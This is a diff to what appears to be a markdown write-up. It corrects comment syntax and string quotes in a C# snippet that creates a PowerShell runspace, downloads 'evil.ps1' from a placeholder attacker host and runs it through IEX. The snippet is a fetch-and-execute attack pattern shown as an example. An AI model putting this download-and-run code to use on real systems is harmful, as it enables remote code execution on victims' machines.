@@ -380,11 +380,11 @@ As an example, please consider the following snippet:
 
 ```csharp
 PowerShell ps = PowerShell.Create();
-# Downloading module/script
-string script = (new WebClient()).DownloadString('http://attackerip/evil.ps1');
-# Import template
+// Downloading module/script
+string script = (new WebClient()).DownloadString("http://attackerip/evil.ps1");
+// Import template
 string code = String.Format("IEX {0}", script);
-# Transferring script to the remote process
+// Transferring script to the remote process
 ps.AddScript(code).Invoke();
 ```
 
